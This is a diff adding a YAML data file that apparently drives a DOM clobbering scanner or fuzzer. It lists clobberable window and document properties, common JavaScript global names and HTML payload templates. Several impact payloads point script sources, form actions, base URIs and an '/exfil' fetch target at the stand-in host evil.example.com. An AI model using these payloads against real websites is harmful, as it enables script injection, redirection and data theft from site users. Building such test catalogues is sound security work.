@@ -1,0 +1,202 @@
+category_map:
+  named_access:
+    - window_anchor_id
+    - window_div_id
+    - window_form_name
+    - window_iframe_name
+    - window_embed_name
+    - window_object_name
+    - window_img_name
+    - window_svg_name
+  form_child:
+    - form_input_name
+    - form_button_name
+    - form_select_name
+    - form_textarea_name
+    - form_fieldset_name
+    - form_output_name
+  impact:
+    - script_src_clobber
+    - form_action_clobber
+    - location_href_clobber
+    - fetch_url_clobber
+    - base_uri_clobber
+    - currentscript_clobber
+window_clobberable:
+  - location
+  - document
+  - self
+  - parent
+  - top
+  - frames
+  - opener
+  - name
+  - status
+  - length
+  - closed
+  - outerHeight
+  - outerWidth
+  - screenX
+  - screenY
+  - innerWidth
+  - innerHeight
+  - localStorage
+  - sessionStorage
+  - console
+  - chrome
+  - navigation
+  - visualViewport
+  - styleMedia
+document_clobberable:
+  - forms
+  - images
+  - scripts
+  - embeds
+  - plugins
+  - anchors
+  - links
+  - all
+  - cookie
+  - domain
+  - URL
+  - baseURI
+  - referrer
+  - title
+  - head
+  - body
+  - documentElement
+common_js_globs:
+  - config
+  - settings
+  - options
+  - params
+  - data
+  - app
+  - module
+  - exports
+  - require
+  - global
+  - root
+  - env
+  - debug
+  - version
+  - url
+  - endpoint
+  - api
+  - callback
+  - handler
+  - store
+  - state
+  - action
+  - target
+  - src
+named_access_payloads:
+  - - window_anchor_id
+    - '<a id="{name}" href="javascript:void(0)">'
+    - id
+    - - a
+      - 'id='
+  - - window_div_id
+    - '<div id="{name}"></div>'
+    - id
+    - - div
+      - 'id='
+  - - window_form_name
+    - '<form name="{name}"></form>'
+    - name
+    - - form
+      - 'name='
+  - - window_iframe_name
+    - '<iframe name="{name}"></iframe>'
+    - name
+    - - iframe
+      - 'name='
+  - - window_embed_name
+    - '<embed name="{name}">'
+    - name
+    - - embed
+      - 'name='
+  - - window_object_name
+    - '<object name="{name}"></object>'
+    - name
+    - - object
+      - 'name='
+  - - window_img_name
+    - '<img name="{name}" src="x">'
+    - name
+    - - img
+      - 'name='
+  - - window_svg_name
+    - '<svg name="{name}"></svg>'
+    - name
+    - - svg
+      - 'name='
+form_child_payloads:
+  - - form_input_name
+    - '<form id="{name}"><input name="action" value="javascript:void(0)"></form>'
+    - action
+    - - input
+      - 'name='
+  - - form_button_name
+    - '<form id="{name}"><button name="action" value="/admin"></button></form>'
+    - action
+    - - button
+      - 'name='
+  - - form_select_name
+    - '<form id="{name}"><select name="target"><option value="evil"></select></form>'
+    - target
+    - - select
+      - 'name='
+  - - form_textarea_name
+    - '<form id="{name}"><textarea name="data">payload</textarea></form>'
+    - data
+    - - textarea
+      - 'name='
+  - - form_fieldset_name
+    - '<form id="{name}"><fieldset name="settings"></fieldset></form>'
+    - settings
+    - - fieldset
+      - 'name='
+  - - form_output_name
+    - '<form id="{name}"><output name="result">payload</output></form>'
+    - result
+    - - output
+      - 'name='
+impact_payloads:
+  - - script_src_clobber
+    - '<a id="{name}" href="//evil.example.com/evil.js">'
+    - script.src
+    - - a
+      - 'id='
+      - 'href='
+  - - form_action_clobber
+    - '<form id="{name}"><input name="action" value="https://evil.example.com"></form>'
+    - form.action
+    - - form
+      - input
+      - 'name='
+  - - location_href_clobber
+    - '<a id="{name}" href="javascript:alert(1)">'
+    - location.href
+    - - a
+      - 'id='
+      - 'href='
+      - javascript:
+  - - fetch_url_clobber
+    - '<a id="{name}" href="//evil.example.com/exfil">'
+    - fetch(url)
+    - - a
+      - 'id='
+      - 'href='
+  - - base_uri_clobber
+    - '<base id="{name}" href="//evil.example.com/">'
+    - document.baseURI
+    - - base
+      - 'id='
+      - 'href='
+  - - currentscript_clobber
+    - '<img name="{name}" src="//evil.example.com/evil.js">'
+    - currentScript.src
+    - - img
+      - 'name='
+      - 'src='
